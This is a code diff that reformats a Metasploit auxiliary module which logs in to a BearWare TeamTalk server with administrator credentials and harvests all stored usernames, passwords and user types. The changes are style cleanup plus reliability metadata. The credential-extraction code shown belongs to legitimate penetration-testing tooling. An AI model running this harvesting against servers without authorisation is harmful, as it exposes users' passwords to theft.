@@ -8,23 +8,31 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'TeamTalk Gather Credentials',
-      'Description' => %q{
-        This module retrieves user credentials from BearWare TeamTalk.
+    super(
+      update_info(
+        info,
+        'Name' => 'TeamTalk Gather Credentials',
+        'Description' => %q{
+          This module retrieves user credentials from BearWare TeamTalk.
 
-        Valid administrator credentials are required.
+          Valid administrator credentials are required.
 
-        This module has been tested successfully on TeamTalk versions
-        5.2.2.4885 and 5.2.3.4893.
-      },
-      'Author'      => 'bcoles',
-      'References'  =>
-        [
+          This module has been tested successfully on TeamTalk versions
+          5.2.2.4885 and 5.2.3.4893.
+        },
+        'Author' => 'bcoles',
+        'References' => [
           # Protocol documentation
           ['URL', 'https://github.com/BearWare/TeamTalk5/blob/master/ttphpadmin/tt5admin.php']
         ],
-      'License'     => MSF_LICENSE))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
     register_options [
       Opt::RPORT(10333),
       OptString.new('USERNAME', [true, 'The username for TeamTalk', 'admin']),
@@ -44,10 +52,10 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status "Found TeamTalk (protocol version #{$1})"
 
-    report_service :host  => rhost,
-                   :port  => rport,
+    report_service :host => rhost,
+                   :port => rport,
                    :proto => 'tcp',
-                   :name  => 'teamtalk'
+                   :name => 'teamtalk'
 
     vprint_status "Authenticating as '#{username}'"
 
@@ -80,8 +88,8 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    cred_table = Rex::Text::Table.new 'Header'  => 'TeamTalk User Credentials',
-                                      'Indent'  => 1,
+    cred_table = Rex::Text::Table.new 'Header' => 'TeamTalk User Credentials',
+                                      'Indent' => 1,
                                       'Columns' => ['Username', 'Password', 'Type']
 
     res.each_line do |line|
@@ -93,10 +101,10 @@ class MetasploitModule < Msf::Auxiliary
       type = line.scan(/\s+usertype=(\d+)\s+/).flatten.first
 
       cred_table << [ user, pass, type ]
-      report_cred user:     user,
+      report_cred user: user,
                   password: pass,
-                  type:     type,
-                  proof:    line
+                  type: type,
+                  proof: line
     end
 
     if cred_table.rows.empty?
@@ -133,26 +141,26 @@ class MetasploitModule < Msf::Auxiliary
 
   def report_cred(opts)
     service_data = {
-      address:      rhost,
-      port:         rport,
+      address: rhost,
+      port: rport,
       service_name: 'teamtalk',
-      protocol:     'tcp',
+      protocol: 'tcp',
       workspace_id: myworkspace_id
     }
 
     credential_data = {
-      origin_type:     :service,
+      origin_type: :service,
       module_fullname: fullname,
-      username:        opts[:user],
-      private_data:    opts[:password],
-      private_type:    :password
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
     }.merge service_data
 
     login_data = {
-      core:              create_credential(credential_data),
-      status:            Metasploit::Model::Login::Status::UNTRIED,
-      access_level:      opts[:type],
-      proof:             opts[:proof]
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      access_level: opts[:type],
+      proof: opts[:proof]
     }.merge service_data
 
     create_credential_login login_data
